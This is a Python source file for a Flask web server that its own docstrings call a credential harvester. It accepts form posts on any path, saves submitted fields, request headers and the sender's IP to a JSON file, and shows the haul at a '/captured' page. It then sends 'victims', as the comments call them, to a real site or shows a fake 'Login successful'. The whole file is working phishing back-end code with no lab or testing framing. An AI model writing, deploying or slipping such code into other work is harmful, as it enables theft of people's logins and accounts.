"""Credential harvester HTTP server"""
import logging
from flask import Flask, request, redirect
from datetime import datetime
from pathlib import Path
import json
import threading

logger = logging.getLogger(__name__)

class CredentialHarvester:
    """Flask-based credential harvester"""
    
    def __init__(self, port: int = 8080, output_file: str = "harvested_creds.json"):
        self.port = port
        self.output_file = Path(output_file)
        self.output_file.parent.mkdir(parents=True, exist_ok=True)
        self.app = Flask(__name__)
        self.captured = []
        self.server_thread = None
        self.redirect_url = None
        
        # Setup routes
        @self.app.route('/', methods=['GET'])
        def index():
            return "Server running", 200
        
        @self.app.route('/<path:path>', methods=['POST'])
        def capture(path):
            return self._capture_credentials(path)
        
        @self.app.route('/captured', methods=['GET'])
        def show_captured():
            return json.dumps(self.captured, indent=2)
    
    def _capture_credentials(self, path):
        """Capture POST data"""
        try:
            data = {
                "timestamp": datetime.now().isoformat(),
                "path": path,
                "form_data": dict(request.form),
                "headers": dict(request.headers),
                "ip": request.remote_addr
            }
            
            self.captured.append(data)
            
            # Save to file
            with open(self.output_file, 'w') as f:
                json.dump(self.captured, f, indent=2)
            
            logger.info(f"Captured credentials from {request.remote_addr}")
            logger.info(f"Data: {data['form_data']}")
            
            # Redirect to real site if configured
            if self.redirect_url:
                return redirect(self.redirect_url, code=302)
            else:
                return "Login successful", 200
                
        except Exception as e:
            logger.error(f"Capture failed: {e}")
            return "Error", 500
    
    def start(self, redirect_url: str = None, background: bool = True):
        """Start the harvester server
        
        Args:
            redirect_url: URL to redirect victims after capture
            background: Run in background thread
        """
        self.redirect_url = redirect_url
        
        if background:
            self.server_thread = threading.Thread(
                target=lambda: self.app.run(host='0.0.0.0', port=self.port, debug=False),
                daemon=True
            )
            self.server_thread.start()
            logger.info(f"Harvester started on port {self.port} (background)")
        else:
            self.app.run(host='0.0.0.0', port=self.port, debug=False)
            logger.info(f"Harvester started on port {self.port}")
    
    def stop(self):
        """Stop the server"""
        # Flask doesn't have a clean shutdown method in thread mode
        logger.info("Harvester stopped")
    
    def get_captured(self):
        """Get all captured credentials"""
        return self.captured


def start_harvester(port: int = 8080, output_file: str = "harvested_creds.json", 
                   redirect_url: str = None) -> CredentialHarvester:
    """Start credential harvester
    
    Args:
        port: Port to listen on
        output_file: File to save captured credentials
        redirect_url: URL to redirect victims after capture
        
    Returns:
        CredentialHarvester instance
    """
    harvester = CredentialHarvester(port, output_file)
    harvester.start(redirect_url=redirect_url, background=True)
    return harvester
